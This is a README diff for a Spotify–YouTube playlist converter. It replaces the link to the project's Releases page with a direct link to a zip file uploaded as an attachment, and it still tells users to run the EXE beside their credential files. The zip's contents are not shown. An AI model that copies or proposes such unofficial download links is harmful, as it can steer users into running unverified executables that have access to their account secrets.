@@ -25,7 +25,7 @@ A Python tool to convert playlists between Spotify and YouTube.
 
 ### Run the EXE (Recommended for most users)
 
-1. Download the latest EXE from the [Releases page](https://github.com/causeych82/Playlist-Converter/releases)  
+1. Download the latest EXE from here [PlaylistConverter-v1.0.zip](https://github.com/user-attachments/files/20524065/PlaylistConverter-v1.0.zip)
 2. Place your credential files (client_secrets.json and spotify_credentials.json) in the same folder as the EXE  
 3. Run the EXE directly — no Python installation needed  
 
